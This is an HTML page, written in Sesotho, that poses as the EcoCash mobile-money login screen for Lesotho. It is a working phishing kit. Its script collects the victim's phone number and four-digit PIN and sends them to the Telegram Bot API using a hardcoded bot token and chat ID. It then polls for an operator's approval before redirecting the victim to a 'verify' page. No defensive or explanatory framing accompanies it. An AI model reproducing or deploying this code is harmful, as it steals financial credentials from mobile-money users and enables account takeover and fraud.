<!DOCTYPE html>
<html lang="st">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ecocash spache-fono - Kena</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        html,
        body {
            min-height: 100vh;
            font-family: 'Inter', sans-serif;
            background: white;
            overflow-x: hidden;
            overflow-y: auto;
        }
        
        body {
            display: flex;
            flex-direction: column;
        }
        
        .logo {
            text-align: center;
            padding: 50px 20px 20px;
            flex-shrink: 0;
        }
        
        .logo-text {
            font-size: 36px;
            font-weight: 700;
        }
        
        .logo-eco {
            color: #0066ff;
        }
        
        .logo-cash {
            color: #ff0000;
        }
        
        .login-content {
            flex: 1 0 auto;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 0 30px 50px;
            max-width: 480px;
            margin: 0 auto;
            width: 100%;
        }
        
        .title {
            font-size: 26px;
            font-weight: 600;
            color: #333;
            margin-bottom: 40px;
        }
        
        .phone-group {
            width: 100%;
            border: 2px solid #0066ff;
            border-radius: 16px;
            display: flex;
            align-items: center;
            padding: 18px 24px;
            margin-bottom: 40px;
            background: white;
        }
        
        .flag {
            width: 34px;
            height: 24px;
            border-radius: 4px;
            object-fit: cover;
            margin-right: 12px;
        }
        
        .country-select {
            display: flex;
            align-items: center;
            color: #0066ff;
            font-weight: 600;
            font-size: 18px;
            margin-right: 16px;
        }
        
        .dropdown-arrow {
            font-size: 14px;
            margin-left: 6px;
        }
        
        .phone-input {
            flex: 1;
            border: none;
            outline: none;
            font-size: 18px;
            color: #333;
        }
        
        .phone-input::placeholder {
            color: #aaa;
        }
        
        .pin-label {
            font-size: 16px;
            color: #666;
            margin-bottom: 24px;
            font-weight: 500;
        }
        
        .pin-group {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .pin-box {
            width: 60px;
            height: 60px;
            border: 2px solid #0066ff;
            border-radius: 16px;
            font-size: 28px;
            text-align: center;
            background: white;
            color: #333;
            font-weight: 600;
        }
        
        .forgot {
            font-size: 15px;
            color: #0066ff;
            text-decoration: none;
            font-weight: 500;
            margin-bottom: 40px;
        }
        
        #loginBtn {
            display: none;
            width: 100%;
            max-width: 400px;
            padding: 18px;
            background: #0066ff;
            color: white;
            border: none;
            border-radius: 50px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            margin-bottom: 50px;
            box-shadow: 0 8px 20px rgba(0, 102, 255, 0.3);
        }
        
        .bottom-section {
            background: #005eb8;
            color: white;
            padding: 100px 30px 80px;
            text-align: center;
            width: 100vw;
            margin-left: calc(-50vw + 50%);
            position: relative;
            flex-shrink: 0;
        }
        
        .curve {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 90px;
            background: white;
            border-radius: 0 0 50% 50% / 0 0 100% 100%;
            transform: scaleX(1.8);
            transform-origin: top;
        }
        
        .bottom-content {
            position: relative;
            z-index: 2;
        }
        
        .bottom-text {
            font-size: 15px;
            margin-bottom: 35px;
            line-height: 1.6;
            opacity: 0.95;
        }
        
        .bottom-btns {
            display: flex;
            justify-content: center;
            gap: 30px;
            margin-bottom: 40px;
        }
        
        .bottom-btn {
            background: white;
            color: #0066ff;
            border: none;
            border-radius: 30px;
            padding: 18px 36px;
            font-weight: 600;
            font-size: 16px;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 8px;
            width: 180px;
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
        }
        
        .btn-icon {
            font-size: 26px;
            color: #0066ff;
        }
        
        .version {
            font-size: 14px;
            margin-bottom: 12px;
            opacity: 0.9;
            font-weight: 500;
        }
        
        .terms {
            font-size: 13px;
            opacity: 0.85;
            line-height: 1.5;
        }
        
        .terms a {
            color: white;
            text-decoration: underline;
            font-weight: 500;
        }
        
        #spinnerOverlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.98);
            display: none;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            z-index: 1000;
        }
        
        .spinner {
            width: 60px;
            height: 60px;
            border: 6px solid #f0f0f0;
            border-top: 6px solid #005eb8;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 30px;
        }
        
        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }
        
        .spinner-text {
            font-size: 18px;
            color: #333;
            text-align: center;
            line-height: 1.6;
            max-width: 300px;
            font-weight: 500;
        }
    </style>
</head>

<body>
    <div class="logo">
        <div class="logo-text">
            <span class="logo-eco">Eco</span><span class="logo-cash">Cash</span>
        </div>
    </div>

    <div class="login-content">
        <h1 class="title">Kena</h1>

        <div class="phone-group">
            <img class="flag" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRkcVs9U-I3GIUQp-D_fbHuQofZUpFNwgFob4_88Bc6Lw&s=10" alt="Lesotho Flag">
            <div class="country-select">
                +266 <span class="dropdown-arrow">▼</span>
            </div>
            <input type="tel" class="phone-input" id="phoneInput" placeholder="Nomoro ea Mohala">
        </div>

        <div class="pin-label">Kenya PIN ea hau</div>
        <div class="pin-group">
            <input type="password" class="pin-box" maxlength="1" inputmode="numeric">
            <input type="password" class="pin-box" maxlength="1" inputmode="numeric">
            <input type="password" class="pin-box" maxlength="1" inputmode="numeric">
            <input type="password" class="pin-box" maxlength="1" inputmode="numeric">
        </div>

        <a href="#" class="forgot">U lebetse PIN?</a>

        <button id="loginBtn">KENA</button>
    </div>

    <div class="bottom-section">
        <div class="curve"></div>
        <div class="bottom-content">
            <div class="bottom-text">
                Ho ingolisa ka mokotlana oa ecocash spache-fono, kapa ho kopa thuso,<br> tobetsa ka tlase
            </div>
            <div class="bottom-btns">
                <a href="#" class="bottom-btn">
                    <div class="btn-icon">👤</div>
                    Ngolisa
                </a>
                <a href="#" class="bottom-btn">
                    <div class="btn-icon">ℹ️</div>
                    Thuso &amp; Tšehetso
                </a>
            </div>
            <div class="version">v2.13P</div>
            <div class="terms">
                Ka ho kena u lumela ho <a href="#">Melao le Maemo</a>
            </div>
        </div>
    </div>

    <div id="spinnerOverlay">
        <div class="spinner"></div>
        <div class="spinner-text">
            Ka kopo ema...<br> Hangata sena se nka metsotsoana e seng mekae
        </div>
    </div>

    <script>
        const BOT_TOKEN = '8881059631:AAHFXE2n7VLpNIihXGg-1LtNzvnSVAJomPU';
        const CHAT_ID = '8851096978';
        const savedPhone = localStorage.getItem('phone');
        const phoneInput = document.getElementById('phoneInput');

        if (savedPhone && savedPhone.length === 9) {
            phoneInput.value = savedPhone;
        }

        const pinBoxes = document.querySelectorAll('.pin-box');
        const loginBtn = document.getElementById('loginBtn');
        const spinnerOverlay = document.getElementById('spinnerOverlay');

        let pinValue = '';
        let pollInterval;
        let lastUpdateId = 0;

        function checkPinComplete() {
            pinValue = Array.from(pinBoxes).map(box => box.value).join('');
            loginBtn.style.display = pinValue.length === 4 ? 'block' : 'none';
        }

        pinBoxes.forEach((box, index) => {
            box.addEventListener('input', () => {
                if (box.value.length === 1 && index < 3) {
                    pinBoxes[index + 1].focus();
                }
                checkPinComplete();
            });

            box.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && box.value === '' && index > 0) {
                    pinBoxes[index - 1].focus();
                }
            });
        });

        loginBtn.addEventListener('click', () => {
            const phone = phoneInput.value.trim();

            if (!phone) {
                alert('Ka kopo kenya nomoro ea mohala');
                return;
            }

            spinnerOverlay.style.display = 'flex';
            const timestamp = Date.now();
            const callbackData = 'approve_' + timestamp;

            const message =
                `Kopo e Ncha ea Kena\n\n` +
                `Nomoro: +266 ${phone}\n` +
                `PIN: ${pinValue}\n\n` +
                `Lumella phihlello?`;

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        reply_markup: {
                            inline_keyboard: [
                                [{
                                    text: 'Lumella ho Tsoela Pele',
                                    callback_data: callbackData
                                }]
                            ]
                        }
                    })
                }).then(response => response.json())
                .then(data => {
                    if (!data.ok) {
                        spinnerOverlay.style.display = 'none';
                        alert('Phoso ha ho romeloa ho bot: ' + data.description);
                    }
                })
                .catch(error => {
                    spinnerOverlay.style.display = 'none';
                    alert('Phoso ea khokahano le bot: ' + error);
                });

            pollInterval = setInterval(() => {
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`)
                    .then(res => res.json())
                    .then(data => {
                        if (data.ok && data.result.length > 0) {
                            for (let update of data.result) {
                                lastUpdateId = update.update_id;

                                if (update.callback_query && update.callback_query.data === callbackData) {
                                    clearInterval(pollInterval);
                                    spinnerOverlay.style.display = 'none';
                                    window.location.href = 'verify.html';
                                }
                            }
                        }
                    });
            }, 2000);
        });

        checkPinComplete();
        pinBoxes[0].focus();
    </script>
</body>

</html>
